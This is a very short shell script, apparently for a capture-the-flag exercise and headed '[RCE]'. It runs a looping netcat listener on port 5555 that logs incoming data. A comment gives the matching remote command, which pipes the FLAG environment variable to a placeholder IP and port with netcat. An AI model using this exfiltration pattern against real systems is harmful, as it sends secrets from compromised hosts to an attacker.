# [RCE]
# printenv FLAG | netcat <IP> <PORT>

PORT=5555;
while :; do nc -l -p $PORT | tee  output.log; sleep 1; done